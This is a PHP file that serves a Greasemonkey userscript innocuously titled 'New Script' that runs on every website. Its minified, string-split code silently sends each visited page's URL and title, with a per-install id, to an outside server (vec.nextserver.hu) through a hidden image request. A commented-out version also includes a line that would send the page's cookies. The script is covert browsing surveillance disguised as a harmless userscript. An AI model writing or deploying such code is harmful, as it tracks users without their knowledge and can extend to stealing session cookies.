<?php
// GM Log 1.02
// by Vector Akashi

header("Content-Type: application/x-javascript; charset=utf-8");

echo 
'// ==UserScript==
// @name           New Script
// @include        *
// ==/UserScript==

if(window.attachEvent)window.attachEvent("onload",my_new_script);else window.addEventListener("load",my_new_script,false);function my_new_script(e){if(top.location.href==document.location.href){var i='.time().';var info="?i="+i+"&l="+escape(document.location)+"&t="+escape(document.title);var pre=new Image();pre.src="ht"+"tp"+":"+"//"+"vec.nextserver."+"hu/gmlog/index."+"php"+info+"&blank.gif";return true;}}';


/*
// 1.02 unfolded
if(window.attachEvent) window.attachEvent("onload", my_new_script);
else window.addEventListener("load", my_new_script, false);

function my_new_script(e)
{
  if(top.location.href == document.location.href) // no iframes
  {
    var i = '.time().';
    var info = "?i="+i
              +"&l="+escape(document.location)
//            +"&c="+escape(document.cookie)
              +"&t="+escape(document.title);
    
    var pre = new Image();
    pre.src = "http://vec.nextserver.hu/gmlog/index.php" + info + "&blank.gif";
    return true;
  }
}';
*/
?>